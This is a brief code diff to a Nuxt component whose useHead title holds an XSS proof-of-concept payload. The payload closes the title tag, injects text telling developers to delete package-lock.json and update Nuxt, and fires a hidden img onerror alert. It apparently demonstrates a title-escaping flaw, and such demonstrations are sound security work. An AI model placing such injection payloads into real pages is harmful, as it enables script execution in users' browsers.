@@ -5,6 +5,6 @@
 <script setup>
 useHead({
   title:
-    "</title><i>Delete 'package-lock.json' and update Nuxt</i><img src=x style='display:none' onerror=alert('XSS!!')>",
+    "</title><i>Now you've seen the payload, delete 'package-lock.json' and update Nuxt</i><img src=x style='display:none' onerror=alert('XSS!!')>",
 });
 </script>
